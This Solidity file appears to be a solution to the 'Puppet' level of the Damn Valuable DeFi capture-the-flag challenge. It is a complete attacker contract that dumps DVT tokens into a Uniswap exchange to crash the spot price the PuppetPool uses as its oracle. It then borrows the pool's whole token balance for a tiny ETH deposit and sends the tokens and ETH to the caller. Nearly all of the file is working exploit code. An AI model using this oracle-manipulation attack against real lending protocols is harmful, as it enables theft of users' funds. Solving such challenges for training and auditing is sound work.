// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../puppet/PuppetPool.sol";

interface IUniswapExchange{
    function tokenToEthSwapInput(
        uint256 tokens_sold,
        uint256 min_eth,
        uint256 deadline
    ) external returns (uint256);
}

contract PuppetAttacker{

    PuppetPool private immutable puppet;
    DamnValuableToken private immutable token;

    constructor(address _puppetAddress, address _token){
        puppet = PuppetPool(_puppetAddress);
        token = DamnValuableToken(_token);
    }

    function attack(address _uniswap, uint256 pool_initial) external payable{
        IUniswapExchange uniswap = IUniswapExchange(_uniswap);
        token.approve(_uniswap, token.balanceOf(address(this)) - 1);
        uniswap.tokenToEthSwapInput(token.balanceOf(address(this)) - 1, 1, block.timestamp + 1);
        uint256 required = puppet.calculateDepositRequired(pool_initial);
        puppet.borrow{value: required}(pool_initial);
        token.transfer(msg.sender, token.balanceOf(address(this)));
        msg.sender.call{value: address(this).balance}(abi.encodeWithSignature(""));
    }

    receive() external payable{
        
    }
}